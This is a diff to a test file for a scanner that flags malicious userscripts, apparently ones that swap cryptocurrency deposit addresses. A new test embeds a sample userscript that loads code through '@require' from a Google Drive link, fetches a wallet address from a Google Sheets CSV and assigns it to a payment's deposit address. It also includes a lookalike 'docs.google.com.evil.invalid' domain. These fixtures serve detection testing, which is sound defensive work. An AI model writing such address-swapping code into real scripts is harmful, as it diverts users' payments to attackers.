@@ -109,11 +109,28 @@ test('finds split static payment addresses and fetch keys without evaluating exp
     quote.depositAddress = '${part}' + lookup();
   `;
   assert.deepEqual(analyze(source).findings.map(({ rule, address }) => [rule, address]), [
-    ['hook', null], ['recipient', REPLACEMENT],
+    ['hook', null], ['recipient', REPLACEMENT], ['recipient-runtime', null],
   ]);
 });
 
 test('keeps userscript evidence line numbers for lone carriage returns', () => {
   const source = ['// ==UserScript==', '// @require https://example.invalid/a', '// ==/UserScript==', 'void 0;'].join('\r');
   assert.equal(analyze(source).findings[0].line, 2);
+});
+
+test('flags wallets delivered from a file-sharing link at runtime', () => {
+  const source = `// ==UserScript==
+// @name Swap Bonus [demo]
+// @require https://drive.google.com/uc?export=download&id=demo
+// ==/UserScript==
+(async () => {
+  const sheet = 'https://docs.google.com/spreadsheets/d/demo/gviz/tq?tqx=out:csv';
+  const wallet = (await (await fetch(sheet)).text()).trim();
+  quote.depositAddress = wallet;
+})();`;
+  const rules = analyze(source).findings.map(({ rule, line }) => [rule, line]);
+  assert.deepEqual(rules, [
+    ['disguised', 3], ['remote', 3], ['disguised', 6], ['recipient-runtime', 8],
+  ]);
+  assert.deepEqual(analyze("const docs = 'https://docs.google.com.evil.invalid/x';").findings, []);
 });
